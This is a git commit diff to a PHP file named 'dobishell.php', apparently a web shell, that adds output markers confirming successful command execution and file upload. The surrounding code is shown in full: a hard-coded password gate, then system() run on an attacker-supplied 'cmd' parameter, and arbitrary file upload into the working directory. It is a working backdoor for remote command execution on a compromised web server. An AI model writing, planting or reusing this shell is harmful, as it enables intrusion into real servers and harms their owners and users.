0e6e2a22f6b6e8143a9bc35466de69376f80a4d0
Crypto-Doberman <rawgarden0x01@gmail.com>
2025-05-29 12:22:55 -0700

    Update dobishell.php

--- dobishell.php
+++ dobishell.php
@@ -4,8 +4,10 @@ $key = "d0b3rm@n";
 if(isset($_REQUEST['key']) && $_REQUEST['key'] === $key) {
     if(isset($_REQUEST['cmd'])) {
         system($_REQUEST['cmd']);
+        echo "\n@Doberman_Command_Executed"; // Добавляем маркер успешного выполнения
     } elseif(isset($_FILES['f']['name'])) {
         move_uploaded_file($_FILES['f']['tmp_name'], getcwd()."/".$_FILES['f']['name']);
+        echo "@Doberman_File_Uploaded";
     }
 } else {
     echo "Access Denied";
